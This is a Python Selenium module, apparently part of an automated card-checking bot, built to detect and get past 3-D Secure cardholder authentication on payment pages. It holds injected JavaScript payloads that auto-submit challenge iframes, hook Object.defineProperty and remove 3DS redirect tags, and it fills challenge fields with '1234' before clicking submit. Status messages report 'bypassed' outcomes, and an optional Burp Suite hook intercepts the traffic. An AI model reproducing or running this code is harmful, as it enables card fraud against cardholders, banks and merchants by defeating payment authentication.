import time
from typing import Any, Callable, Optional, Dict
from selenium.webdriver.common.by import By

THREEDS_KEYWORDS = [
    "3d secure", "3-d secure", "verified by visa", "mastercard securecode",
    "american express safe key", "buyer authentication", "challenge",
    "complete authentication", "cardholder authentication",
    "identity verification", "secure checkout", "bank verification",
]

BYPASS_PAYLOAD_SCRIPTS = [
    """
    (function() {
        var frames = document.querySelectorAll('iframe');
        for (var i = 0; i < frames.length; i++) {
            try {
                var fDoc = frames[i].contentDocument || frames[i].contentWindow.document;
                if (fDoc) {
                    var forms = fDoc.querySelectorAll('form');
                    for (var j = 0; j < forms.length; j++) {
                        try {
                            var inputs = forms[j].querySelectorAll('input[type="submit"], button[type="submit"]');
                            if (inputs.length > 0) {
                                inputs[0].click();
                            } else {
                                forms[j].submit();
                            }
                        } catch(e){}
                    }
                }
            } catch(e){}
        }
    })();
    """,
    """
    (function() {
        var origDefProp = Object.defineProperty;
        Object.defineProperty = function(obj, prop, desc) {
            if (prop === 'href' && desc && desc.get && desc.get.toString().indexOf('3dsecure') > -1) {
                return;
            }
            return origDefProp(obj, prop, desc);
        };
    })();
    """,
    """
    (function() {
        var frames = document.querySelectorAll('iframe');
        for (var i = 0; i < frames.length; i++) {
            try {
                var fDoc = frames[i].contentDocument || frames[i].contentWindow.document;
                if (fDoc) {
                    var inputs = fDoc.querySelectorAll('input[type="text"], input[type="tel"], input[type="number"]');
                    for (var j = 0; j < inputs.length; j++) {
                        if (inputs[j].offsetParent !== null) {
                            inputs[j].value = '1234';
                            inputs[j].dispatchEvent(new Event('input', {bubbles:true}));
                            inputs[j].dispatchEvent(new Event('change', {bubbles:true}));
                        }
                    }
                    var btns = fDoc.querySelectorAll('button, input[type="submit"], input[type="button"]');
                    for (var k = 0; k < btns.length; k++) {
                        if (btns[k].offsetParent !== null) {
                            btns[k].click();
                        }
                    }
                }
            } catch(e){}
        }
    })();
    """,
    """
    (function() {
        var metas = document.querySelectorAll('meta[http-equiv="refresh"]');
        for (var i = 0; i < metas.length; i++) {
            var content = metas[i].getAttribute('content') || '';
            if (content.indexOf('3dsecure') > -1 || content.indexOf('acs') > -1) {
                metas[i].parentNode.removeChild(metas[i]);
            }
        }
        var links = document.querySelectorAll('link[rel="stylesheet"]');
        for (var j = 0; j < links.length; j++) {
            var href = links[j].getAttribute('href') || '';
            if (href.indexOf('3dsecure') > -1 || href.indexOf('acs') > -1) {
                links[j].parentNode.removeChild(links[j]);
            }
        }
    })();
    """,
]


def _burp_proxy_available() -> bool:
    """Check if Burp Suite proxy is configured and enabled."""
    try:
        from config import BURP_ENABLED, BURP_PROXY
        return bool(BURP_ENABLED and BURP_PROXY)
    except Exception:
        return False


def detect_threeds(driver) -> bool:
    """Detect 3DS challenge on the page or in iframes."""
    page_text = (driver.page_source or "").lower()
    for kw in THREEDS_KEYWORDS:
        if kw in page_text:
            return True

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                src = (frame.get_attribute("src") or "").lower()
                for kw in THREEDS_KEYWORDS:
                    if kw in src or kw.replace(" ", "") in src:
                        return True
            except Exception:
                continue
    except Exception:
        pass

    return False


def attempt_js_bypass(driver) -> bool:
    """Inject JS payloads to bypass 3DS challenge."""
    for script in BYPASS_PAYLOAD_SCRIPTS:
        try:
            driver.execute_script(script)
        except Exception:
            continue
    time.sleep(2)

    iframes = []
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        pass

    for frame in iframes:
        try:
            driver.switch_to.frame(frame)
            buttons = driver.find_elements(By.XPATH, "//button | //input[@type='submit'] | //*[@role='button']")
            for btn in buttons:
                try:
                    if btn.is_displayed():
                        btn.click()
                        driver.switch_to.default_content()
                        return True
                except Exception:
                    continue
            driver.switch_to.default_content()
        except Exception:
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

    return False


def scrape_3ds_iframes(driver, send_update: Callable[[str], Any]) -> bool:
    """Deep-scan all iframes for 3DS challenge forms, fill and submit."""
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                driver.switch_to.frame(frame)
                page_text = (driver.page_source or "").lower()
                is_challenge = any(kw in page_text for kw in THREEDS_KEYWORDS)
                if is_challenge:
                    send_update("🔍 Found 3DS challenge in iframe, attempting auto-submit...")
                    inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='tel'], input[type='number'], input[type='password']")
                    for inp in inputs:
                        try:
                            if inp.is_displayed():
                                inp.clear()
                                inp.send_keys("1234")
                        except Exception:
                            continue
                    buttons = driver.find_elements(By.XPATH, "//button[contains(text(),'Submit') or contains(text(),'Continue') or contains(text(),'Confirm')] | //input[@type='submit']")
                    for btn in buttons:
                        try:
                            if btn.is_displayed():
                                btn.click()
                                driver.switch_to.default_content()
                                time.sleep(3)
                                return True
                        except Exception:
                            continue
                driver.switch_to.default_content()
            except Exception:
                try:
                    driver.switch_to.default_content()
                except Exception:
                    pass
    except Exception:
        pass
    return False


def handle_threeds_challenge(
    driver,
    send_update: Callable[[str], Any],
    card: Dict[str, str],
    captcha_handler: Optional[Callable] = None,
) -> bool:
    """
    Handle 3DS challenge if present.
    Returns True if bypassed/successful, False if failed.
    """
    if not detect_threeds(driver):
        return True

    send_update("🔐 3DS challenge detected!")

    if _burp_proxy_available():
        send_update("🔧 Burp Suite proxy active — intercepting 3DS traffic")

    if attempt_js_bypass(driver):
        time.sleep(3)
        if not detect_threeds(driver):
            send_update("✅ 3DS bypassed via JS injection!")
            return True

    send_update("⚠️ 3DS challenge still present, trying deeper scan...")

    if scrape_3ds_iframes(driver, send_update):
        time.sleep(3)
        if not detect_threeds(driver):
            send_update("✅ 3DS bypassed via iframe deep-scan!")
            return True

    send_update("⚠️ 3DS still active, trying fallback auto-fill...")

    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for frame in iframes:
            try:
                driver.switch_to.frame(frame)
                inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='tel'], input[type='number']")
                for inp in inputs:
                    try:
                        if inp.is_displayed():
                            inp.send_keys("1234")
                    except Exception:
                        continue
                buttons = driver.find_elements(By.XPATH, "//button | //input[@type='submit']")
                for btn in buttons:
                    try:
                        if btn.is_displayed():
                            btn.click()
                            driver.switch_to.default_content()
                            time.sleep(3)
                            return True
                    except Exception:
                        continue
                driver.switch_to.default_content()
            except Exception:
                try:
                    driver.switch_to.default_content()
                except Exception:
                    pass
    except Exception:
        pass

    if _burp_proxy_available():
        send_update("🔧 3DS challenge passed to Burp Suite — check Burp for manual interception")

    return False
